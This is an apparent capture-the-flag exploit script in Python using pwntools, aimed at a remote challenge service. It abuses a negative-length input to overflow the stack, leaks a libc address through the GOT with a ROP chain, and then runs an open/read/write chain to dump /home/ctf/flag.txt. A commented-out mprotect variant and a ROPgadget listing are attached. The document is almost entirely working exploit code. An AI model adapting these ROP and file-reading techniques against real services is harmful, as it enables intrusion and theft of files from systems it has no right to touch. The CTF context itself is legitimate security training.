from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node1.anna.nssctf.cn",28079)
# io=process("./service")
elf=ELF("./service")
libc=ELF("libc2.so")

leave_ret=0x4012c8
pop_rdi=0x401443
pop_rsi_r15=0x401441
bss_addr=0x404060+0x900 

io.sendlineafter(b"?\n",b"-1")
io.recvuntil(b"?\n")


payload=cyclic(0x38)+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got[b"write"])+p64(0)+p64(elf.plt[b"write"])+p64(0x401311)
io.send(payload)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"write"]
print("leak_addr:",hex(leak_addr))

open_a=leak_addr+libc.sym[b"open"]
read_a=leak_addr+libc.sym[b"read"]
write_a=leak_addr+libc.sym[b"write"]
mprotect_a=leak_addr+libc.sym[b"mprotect"]
pop_rsi=leak_addr+0x23eea
pop_rdx=leak_addr+0x1b96
pop_rax=leak_addr+0x43ae8
# syscall=leak_addr+0x13c0
syscall_ret=leak_addr+0xd2745

# gdb.attach(io)
# pause()

# # mprotect()
# io.sendlineafter(b"?\n",b"-1")
# io.recvuntil(b"?\n")
# payload=cyclic(0x38)+p64(pop_rdi)+p64(0x404000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)+p64(7)+p64(mprotect_a)+p64(elf.sym[b"read"])+p64(0x401311)
# io.send(payload)

#open
# orw=p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
orw=p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss_addr+0x200)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss_addr+0x200)+p64(pop_rdx)+p64(0x50)+p64(write_a)

io.sendlineafter(b"?\n",b"-1")
io.recvuntil(b"?\n")
payload=cyclic(0x38)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+p64(pop_rdx)+p64(0x50)+p64(elf.sym[b"read"])+p64(0x401311)
io.send(payload)
io.send(b"/home/ctf/flag.txt")

# gdb.attach(io)
# pause()

io.sendlineafter(b"?\n",b"-1")
io.recvuntil(b"?\n")
payload=cyclic(0x38)+orw
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040143c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040143e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401440 : pop r14 ; pop r15 ; ret
# 0x0000000000401442 : pop r15 ; ret
# 0x000000000040143b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040143f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401443 : pop rdi ; ret
# 0x0000000000401441 : pop rsi ; pop r15 ; ret
# 0x000000000040143d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x00000000004012b2 : ret 0x2be
# 0x00000000004013ae : ret 0x8d48

# Unique gadgets found: 13